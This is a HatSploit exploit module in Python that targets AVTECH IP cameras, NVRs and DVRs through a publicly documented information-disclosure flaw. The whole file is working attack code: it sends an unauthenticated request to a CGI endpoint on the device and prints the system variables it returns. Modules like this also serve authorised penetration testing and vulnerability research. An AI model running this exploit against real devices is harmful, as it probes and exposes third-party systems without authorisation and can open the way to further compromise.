"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "AVTECH IP Camera Information Disclosure",
            'Module': "exploit/linux/avtech/ipcamera_information_disclosure",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "Gergely Eberhardt - vulnerability researcher"
            ],
            'Description': "AVTECH IP Camera / NVR / DVR devices information disclosure.",
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'References': [
                {'URL': 'https://www.exploit-db.com/exploits/40500'},
                {'EDB': 40500}
            ],
            'DisclosureDate': "2016-10-11",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

    def check(self):
        response = self.http_request(
            method="GET",
            path='/cgi-bin/nobody/Machine.cgi?action=get_capability',
        )

        if response and response.status_code == 200:
            return True

        return False

    def run(self):
        response = self.http_request(
            method="GET",
            path='/cgi-bin/nobody/Machine.cgi?action=get_capability',
        )

        data = response.text.strip()
        headers = ('Variable', 'Value')
        variables = []

        for variable in data.split('\n'):
            variable = variable.split('=')

            if len(variable) >= 2:
                variables.append((variable[0], variable[1]))

        self.print_table("System Information", headers, *variables)
